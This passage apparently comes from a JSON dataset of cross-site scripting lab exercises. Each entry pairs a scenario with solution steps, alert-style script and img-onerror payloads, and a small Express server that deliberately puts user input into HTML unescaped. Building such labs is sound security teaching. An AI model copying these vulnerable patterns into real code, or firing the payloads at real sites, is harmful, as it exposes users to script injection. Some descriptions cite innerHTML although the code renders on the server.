    "srcCode": "const express = require('express');\nconst app = express();\nlet bio = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/update-bio', (req, res) => { bio = req.body.bio; res.redirect('/profile'); });\napp.get('/profile', (req, res) => { res.send(`<html><body><div>${bio}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via project feedback suggestion text",
    "Lab Description": "Feedback on projects includes a suggestion text field. These are displayed to admins using innerHTML. XSS is possible through malicious suggestion input.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a suggestion: <img src=x onerror=alert(1)>",
      "Admin views feedback dashboard",
      "Script executes from suggestion list"
    ],
    "payloads": [
      "<script>alert('feedbackXSS')</script>",
      "<img src=x onerror=alert('suggestion')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet suggestions = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/submit-feedback', (req, res) => { suggestions.push(req.body.suggestion); res.redirect('/admin/feedback'); });\napp.get('/admin/feedback', (req, res) => { const html = suggestions.map(s => `<li>${s}</li>`).join(''); res.send(`<html><body><ul>${html}</ul></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via team dashboard widget name",
    "Lab Description": "Teams can customize widget names on their dashboard. These names are injected into the UI using innerHTML. A crafted name results in persistent XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Name a widget: <script>alert(1)</script>",
      "Return to dashboard",
      "Observe script execution from widget name"
    ],
    "payloads": [
      "<script>alert('widgetXSS')</script>",
      "<img src=x onerror=alert('widget')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet widgets = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-widget', (req, res) => { widgets.push(req.body.name); res.redirect('/dashboard'); });\napp.get('/dashboard', (req, res) => { const html = widgets.map(w => `<div>${w}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via comment system reply preview",
    "Lab Description": "When replying to a comment, a live preview is shown using the input. If the content is reflected using innerHTML, reflected XSS is possible.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Type reply: <img src=x onerror=alert(1)>",
      "Observe live preview window",
      "Script executes immediately"
    ],
    "payloads": [
      "<script>alert('replyXSS')</script>",
      "<img src=x onerror=alert('preview')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\napp.post('/preview-reply', (req, res) => { const reply = req.body.reply; res.send(`<html><body><div>${reply}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via bug tracker issue title",
    "Lab Description": "Bug reports include titles that are rendered in an issue tracker. If innerHTML is used for rendering without escaping, a malicious title triggers XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit bug with title: <script>alert(1)</script>",
      "Open the issue in tracker",
      "Script executes from title element"
    ],
    "payloads": [
      "<script>alert('bugXSS')</script>",
      "<img src=x onerror=alert('issue')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet issues = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/submit-issue', (req, res) => { issues.push(req.body.title); res.redirect('/issues'); });\napp.get('/issues', (req, res) => { const html = issues.map(i => `<h3>${i}</h3>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via activity log detail description",
    "Lab Description": "The activity log renders user actions using innerHTML. A manipulated action message can result in persistent XSS when viewed by an admin.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Trigger action message with <script>alert(1)</script>",
      "Admin reviews activity log",
      "Payload executes"
    ],
    "payloads": [
      "<script>alert('logXSS')</script>",
      "<img src=x onerror=alert('log')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet log = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/log-action', (req, res) => { log = req.body.action; res.redirect('/admin/logs'); });\napp.get('/admin/logs', (req, res) => { res.send(`<html><body><div>${log}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via calendar invite title preview",
    "Lab Description": "Users can preview the title of a calendar invite before sending it. The title is rendered in a header using innerHTML. If not sanitized, this can lead to XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Enter title: <script>alert(1)</script>",
      "Click 'Preview Invite'",
      "Observe script execution in header"
    ],
    "payloads": [
      "<script>alert('inviteXSS')</script>",
      "<img src=x onerror=alert('calendar')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet title = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-title', (req, res) => { title = req.body.title; res.redirect('/preview-invite'); });\napp.get('/preview-invite', (req, res) => { res.send(`<html><body><h1>${title}</h1></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via webhook configuration name",
    "Lab Description": "Users can configure and name webhooks. These names are listed in the webhook dashboard using innerHTML. A malicious name triggers XSS in the list view.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create webhook with name: <script>alert(1)</script>",
      "Visit webhook configuration list",
      "Observe payload execution"
    ],
    "payloads": [
      "<script>alert('hookXSS')</script>",
      "<img src=x onerror=alert('webhook')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet hooks = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-hook', (req, res) => { hooks.push(req.body.name); res.redirect('/webhooks'); });\napp.get('/webhooks', (req, res) => { const html = hooks.map(h => `<div>${h}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via profile status message rendering",
    "Lab Description": "Users can set a short status message on their profile. This message is displayed using innerHTML on various pages like friends list and search results. A malicious message leads to XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set your status to <img src=x onerror=alert('status')>",
      "Visit the search or friends page",
      "Observe XSS execution in status display"
    ],
    "payloads": [
      "<script>alert('statusXSS')</script>",
      "<img src=x onerror=alert('status')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet status = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-status', (req, res) => { status = req.body.msg; res.redirect('/friends'); });\napp.get('/friends', (req, res) => { res.send(`<html><body><div>${status}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via newsletter unsubscribe confirmation page",
    "Lab Description": "After clicking an unsubscribe link, users are shown a confirmation message that includes their email address. The email is reflected using innerHTML. Malicious parameters can trigger XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Visit /unsubscribe?email=<img src=x onerror=alert(1)>",
      "Observe script execution in confirmation page"
    ],
    "payloads": [
      "<script>alert('unsubscribeXSS')</script>",
      "<img src=x onerror=alert('unsub')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/unsubscribe', (req, res) => {\n  const email = req.query.email || 'anonymous';\n  res.send(`<html><body><p>Unsubscribed: ${email}</p></body></html>`);\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via invoice recipient name rendering",
    "Lab Description": "Invoices display the recipient's name in the header. If this field is user-controlled and rendered with innerHTML, XSS can occur.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit recipient: <img src=x onerror=alert(1)>",
      "Generate invoice",
      "Observe script execution in rendered name"
    ],
    "payloads": [
      "<script>alert('invoiceXSS')</script>",
      "<img src=x onerror=alert('recipient')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet recipient = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-recipient', (req, res) => { recipient = req.body.name; res.redirect('/invoice'); });\napp.get('/invoice', (req, res) => { res.send(`<html><body><h1>Invoice to: ${recipient}</h1></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via chat message preview notification",
    "Lab Description": "Incoming chat messages are previewed in pop-up notifications. If messages are rendered using innerHTML without filtering, stored XSS is possible.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send message: <script>alert('chat')</script>",
      "Receiver views notification",
      "Payload executes in pop-up preview"
    ],
    "payloads": [
      "<script>alert('chatNotifXSS')</script>",
      "<img src=x onerror=alert('msg')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet lastMessage = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/send-message', (req, res) => { lastMessage = req.body.msg; res.redirect('/notify'); });\napp.get('/notify', (req, res) => { res.send(`<html><body><div class='popup'>${lastMessage}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via music playlist description rendering",
    "Lab Description": "Users can add descriptions to playlists. These descriptions are rendered using innerHTML. A malicious description triggers stored XSS on playlist load.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set playlist description to: <img src=x onerror=alert(1)>",
      "View the playlist",
      "Script executes in description area"
    ],
    "payloads": [
      "<script>alert('playlistXSS')</script>",
      "<img src=x onerror=alert('desc')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet desc = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-description', (req, res) => { desc = req.body.desc; res.redirect('/playlist'); });\napp.get('/playlist', (req, res) => { res.send(`<html><body><p>${desc}</p></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via customer support ticket subject line",
    "Lab Description": "Support tickets include a subject line set by the user. If this is rendered in the dashboard with innerHTML, stored XSS is possible.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit ticket with subject: <img src=x onerror=alert(1)>",
      "Support staff opens the dashboard",
      "Payload executes from subject rendering"
    ],
    "payloads": [
      "<script>alert('ticketXSS')</script>",
      "<img src=x onerror=alert('ticket')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet subjects = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/submit-ticket', (req, res) => { subjects.push(req.body.subject); res.redirect('/support'); });\napp.get('/support', (req, res) => { const html = subjects.map(s => `<li>${s}</li>`).join(''); res.send(`<html><body><ul>${html}</ul></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via event RSVP name rendering",
    "Lab Description": "The RSVP list displays attendee names on the public event page. If names are rendered unsanitized via innerHTML, XSS is possible.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "RSVP with name: <script>alert(1)</script>",
      "Open public guest list",
      "Observe script execution"
    ],
    "payloads": [
      "<script>alert('rsvpXSS')</script>",
      "<img src=x onerror=alert('attendee')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet names = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/rsvp', (req, res) => { names.push(req.body.name); res.redirect('/event'); });\napp.get('/event', (req, res) => { const html = names.map(n => `<p>${n}</p>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via blog archive post snippet rendering",
    "Lab Description": "The blog archive displays a snippet of each post. If the snippet is rendered using innerHTML and contains user-controlled content, XSS can occur.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Write a blog post with snippet: <script>alert(1)</script>",
      "Open blog archive page",
      "Observe payload execution in snippet area"
    ],
    "payloads": [
      "<script>alert('blogSnippetXSS')</script>",
      "<img src=x onerror=alert('snippet')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet snippet = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/submit-post', (req, res) => { snippet = req.body.snippet; res.redirect('/archive'); });\napp.get('/archive', (req, res) => { res.send(`<html><body><div>${snippet}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via shipping instruction note",
    "Lab Description": "Customers can leave special instructions during checkout. These are rendered using innerHTML on the order summary. Malicious notes lead to XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit instruction: <img src=x onerror=alert(1)>",
      "View order summary",
      "Observe XSS from note"
    ],
    "payloads": [
      "<script>alert('shippingXSS')</script>",
      "<img src=x onerror=alert('note')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet note = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/checkout', (req, res) => { note = req.body.note; res.redirect('/summary'); });\napp.get('/summary', (req, res) => { res.send(`<html><body><p>${note}</p></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via announcement banner title",
    "Lab Description": "Admins can create banners to be shown site-wide. Banner titles are rendered using innerHTML on all pages. A malicious banner title results in persistent XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set banner title to <script>alert(1)</script>",
      "Visit homepage",
      "Observe XSS payload triggering"
    ],
    "payloads": [
      "<script>alert('bannerTitleXSS')</script>",
      "<img src=x onerror=alert('banner')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet banner = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-banner', (req, res) => { banner = req.body.title; res.redirect('/'); });\napp.get('/', (req, res) => { res.send(`<html><body><div class='banner'>${banner}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via task board column title",
    "Lab Description": "In the task board view, users can rename column titles (e.g. 'To Do', 'In Progress'). These titles are injected using innerHTML. A malicious title leads to persistent XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Rename a column to <script>alert('XSS')</script>",
      "Open the board view",
      "Observe payload execution in column header"
    ],
    "payloads": [
      "<script>alert('columnXSS')</script>",
      "<img src=x onerror=alert('col')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet title = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-column', (req, res) => { title = req.body.title; res.redirect('/board'); });\napp.get('/board', (req, res) => { res.send(`<html><body><h2>${title}</h2></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via file manager folder name",
    "Lab Description": "The web-based file manager allows users to name folders. If the folder name is displayed using innerHTML, it can be abused to execute arbitrary scripts.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create a folder named <img src=x onerror=alert(1)>",
      "Navigate to the file manager interface",
      "Observe XSS on folder render"
    ],
    "payloads": [
      "<script>alert('folderXSS')</script>",
      "<img src=x onerror=alert('folder')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet folders = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-folder', (req, res) => { folders.push(req.body.name); res.redirect('/files'); });\napp.get('/files', (req, res) => { const html = folders.map(f => `<div>${f}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via custom footer message in landing page builder",
    "Lab Description": "The landing page builder allows setting custom footer text. If rendered without sanitization using innerHTML, this opens the door for stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Enter footer text: <script>alert('footer')</script>",
      "Publish and view landing page",
      "Observe payload execution in footer"
    ],
    "payloads": [
      "<script>alert('footerXSS')</script>",
      "<img src=x onerror=alert('foot')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet footer = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-footer', (req, res) => { footer = req.body.text; res.redirect('/landing'); });\napp.get('/landing', (req, res) => { res.send(`<html><body><footer>${footer}</footer></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via e-learning module title input",
    "Lab Description": "Course creators can enter module titles in the LMS. These titles are rendered in the course overview using innerHTML. XSS occurs when a malicious title is entered.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create module: <img src=x onerror=alert(1)>",
      "Open course overview page",
      "Script executes on title render"
    ],
    "payloads": [
      "<script>alert('moduleXSS')</script>",
      "<img src=x onerror=alert('lesson')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet title = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-module', (req, res) => { title = req.body.title; res.redirect('/course'); });\napp.get('/course', (req, res) => { res.send(`<html><body><h2>${title}</h2></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via code snippet filename in IDE preview",
    "Lab Description": "The in-browser IDE displays filenames next to code snippets. If the name is unsanitized and rendered with innerHTML, XSS is possible.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create a file named <img src=x onerror=alert(1)>",
      "Open file preview in IDE",
      "Observe script execution in filename label"
    ],
    "payloads": [
      "<script>alert('fileXSS')</script>",
      "<img src=x onerror=alert('ide')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet filename = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-file', (req, res) => { filename = req.body.name; res.redirect('/editor'); });\napp.get('/editor', (req, res) => { res.send(`<html><body><h3>${filename}</h3></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via job listing custom location field",
    "Lab Description": "Job posters can specify custom locations. These locations are displayed using innerHTML on job listings. A malicious location results in stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Post job with location: <script>alert(1)</script>",
      "View public job board",
      "Script executes from location field"
    ],
    "payloads": [
      "<script>alert('locationXSS')</script>",
      "<img src=x onerror=alert('loc')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet location = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/post-job', (req, res) => { location = req.body.loc; res.redirect('/jobs'); });\napp.get('/jobs', (req, res) => { res.send(`<html><body><span>${location}</span></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via personal goal title in productivity app",
    "Lab Description": "Users can set personal goals with titles. These titles are rendered in the dashboard via innerHTML. A crafted title leads to XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create goal: <img src=x onerror=alert(1)>",
      "Visit dashboard",
      "Observe script execution"
    ],
    "payloads": [
      "<script>alert('goalXSS')</script>",
      "<img src=x onerror=alert('goal')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet goal = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-goal', (req, res) => { goal = req.body.title; res.redirect('/goals'); });\napp.get('/goals', (req, res) => { res.send(`<html><body><h2>${goal}</h2></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via document annotation popup content",
    "Lab Description": "The document viewer displays popup annotations on hover. If annotations are stored using innerHTML, XSS can be triggered via crafted annotation content.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Add annotation: <img src=x onerror=alert(1)>",
      "Hover over annotated section",
      "Payload triggers in popup"
    ],
    "payloads": [
      "<script>alert('annotateXSS')</script>",
      "<img src=x onerror=alert('note')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet annotation = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-note', (req, res) => { annotation = req.body.note; res.redirect('/viewer'); });\napp.get('/viewer', (req, res) => { res.send(`<html><body><div title='${annotation}'>Hover here</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via stock ticker symbol display",
    "Lab Description": "The financial dashboard allows tracking stock tickers. If the symbol is reflected in the UI using innerHTML, attackers can inject XSS via the ticker name.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Track symbol: <img src=x onerror=alert(1)>",
      "Open stock dashboard",
      "Observe execution in ticker element"
    ],
    "payloads": [
      "<script>alert('stockXSS')</script>",
      "<img src=x onerror=alert('ticker')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet ticker = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/track-stock', (req, res) => { ticker = req.body.symbol; res.redirect('/stocks'); });\napp.get('/stocks', (req, res) => { res.send(`<html><body><span>${ticker}</span></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via system alert configuration message",
    "Lab Description": "System administrators can configure custom alert messages. If the message is reflected using innerHTML, XSS may occur in global alert modals.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Set alert message: <script>alert('XSS')</script>",
      "Trigger system alert modal",
      "Observe script execution in alert content"
    ],
    "payloads": [
      "<script>alert('alertXSS')</script>",
      "<img src=x onerror=alert('sys')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet alertMsg = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-alert', (req, res) => { alertMsg = req.body.message; res.redirect('/dashboard'); });\napp.get('/dashboard', (req, res) => { res.send(`<html><body><div class='modal'>${alertMsg}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via API key description in developer dashboard",
    "Lab Description": "The developer dashboard allows users to label their API keys with custom descriptions. These labels are rendered using innerHTML. A malicious description leads to persistent XSS when viewing the key list.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create API key with description: <img src=x onerror=alert(1)>",
      "Go to developer dashboard",
      "Observe payload execution"
    ],
    "payloads": [
      "<script>alert('apikeyXSS')</script>",
      "<img src=x onerror=alert('key')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet keys = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-key', (req, res) => { keys.push(req.body.desc); res.redirect('/dashboard'); });\napp.get('/dashboard', (req, res) => { const html = keys.map(k => `<div>${k}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via event log tag entry in admin panel",
    "Lab Description": "Event logs are tagged for easier filtering. Tags are rendered into filter dropdowns using innerHTML. A malicious tag name can lead to XSS when admins browse filters.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create tag: <img src=x onerror=alert(1)>",
      "Admin views event log filters",
      "Payload executes inside dropdown"
    ],
    "payloads": [
      "<script>alert('logTagXSS')</script>",
      "<img src=x onerror=alert('tag')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet tags = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-tag', (req, res) => { tags.push(req.body.name); res.redirect('/logs'); });\napp.get('/logs', (req, res) => { const html = tags.map(t => `<option>${t}</option>`).join(''); res.send(`<html><body><select>${html}</select></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via user's 'current mood' status",
    "Lab Description": "Social profiles display a 'current mood' message submitted by users. The message is shown using innerHTML, and a malicious payload can lead to XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Set mood to <script>alert('mood')</script>",
      "Visit profile or friend list",
      "Observe XSS execution"
    ],
    "payloads": [
      "<script>alert('moodXSS')</script>",
      "<img src=x onerror=alert('mood')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet mood = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-mood', (req, res) => { mood = req.body.mood; res.redirect('/profile'); });\napp.get('/profile', (req, res) => { res.send(`<html><body><p>${mood}</p></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via custom bookmark folder name",
    "Lab Description": "Users can organize saved pages into folders with custom names. If the folder name is rendered using innerHTML, XSS can occur.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Name a folder: <img src=x onerror=alert(1)>",
      "View bookmarks list",
      "Observe XSS payload execution"
    ],
    "payloads": [
      "<script>alert('bookmarkXSS')</script>",
      "<img src=x onerror=alert('folder')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet folders = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-folder', (req, res) => { folders.push(req.body.name); res.redirect('/bookmarks'); });\napp.get('/bookmarks', (req, res) => { const html = folders.map(f => `<li>${f}</li>`).join(''); res.send(`<html><body><ul>${html}</ul></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via comment system reaction emoji label",
    "Lab Description": "Users can assign custom text labels to emoji reactions. These labels are shown in tooltips using innerHTML. A crafted label triggers XSS on hover.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Add emoji label: <img src=x onerror=alert(1)>",
      "Hover over the emoji",
      "Observe script execution in tooltip"
    ],
    "payloads": [
      "<script>alert('emojiXSS')</script>",
      "<img src=x onerror=alert('emoji')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet label = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-label', (req, res) => { label = req.body.label; res.redirect('/comments'); });\napp.get('/comments', (req, res) => { res.send(`<html><body><span title='${label}'>😀</span></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via account deletion reason",
    "Lab Description": "When a user deletes their account, they can submit a reason. Admins review this input in a panel that uses innerHTML, allowing for persistent XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit reason: <img src=x onerror=alert(1)>",
      "Admin opens deletion panel",
      "Payload executes on view"
    ],
    "payloads": [
      "<script>alert('deleteXSS')</script>",
      "<img src=x onerror=alert('reason')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet reasons = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/delete-account', (req, res) => { reasons.push(req.body.reason); res.redirect('/'); });\napp.get('/admin/deletions', (req, res) => { const html = reasons.map(r => `<li>${r}</li>`).join(''); res.send(`<html><body><ul>${html}</ul></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via CRM contact note rendering",
    "Lab Description": "Sales agents can log notes on client records. If these notes are rendered using innerHTML, a malicious note can trigger XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add note: <script>alert(1)</script>",
      "Open CRM client page",
      "Script executes in notes section"
    ],
    "payloads": [
      "<script>alert('crmNoteXSS')</script>",
      "<img src=x onerror=alert('crm')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet notes = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-note', (req, res) => { notes.push(req.body.note); res.redirect('/client'); });\napp.get('/client', (req, res) => { const html = notes.map(n => `<div>${n}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via online store shipping method label",
    "Lab Description": "Vendors can define custom shipping method names. If rendered unsanitized, these names can introduce XSS in the checkout interface.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create shipping label: <img src=x onerror=alert(1)>",
      "Customer opens shipping method options",
      "Observe script execution"
    ],
    "payloads": [
      "<script>alert('shippingXSS')</script>",
      "<img src=x onerror=alert('ship')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet methods = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-method', (req, res) => { methods.push(req.body.label); res.redirect('/checkout'); });\napp.get('/checkout', (req, res) => { const html = methods.map(m => `<div>${m}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via appointment title in calendar tooltip",
    "Lab Description": "Calendar events display their titles in tooltips. If the title includes a malicious payload and is rendered with innerHTML, XSS can occur on hover.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Create event title: <img src=x onerror=alert(1)>",
      "Hover over calendar event",
      "Observe XSS execution"
    ],
    "payloads": [
      "<script>alert('calendarXSS')</script>",
      "<img src=x onerror=alert('event')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet event = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-event', (req, res) => { event = req.body.title; res.redirect('/calendar'); });\napp.get('/calendar', (req, res) => { res.send(`<html><body><div title='${event}'>📅</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via live auction item name",
    "Lab Description": "The auction platform allows sellers to name items freely. These names are rendered in real-time to all viewers using innerHTML. A crafted name results in stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "List item with name: <script>alert('auction')</script>",
      "Join auction room",
      "Observe payload execution on item broadcast"
    ],
    "payloads": [
      "<script>alert('auctionXSS')</script>",
      "<img src=x onerror=alert('bid')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet items = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/list-item', (req, res) => { items.push(req.body.name); res.redirect('/auction'); });\napp.get('/auction', (req, res) => { const html = items.map(i => `<div>${i}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via profile badge custom label",
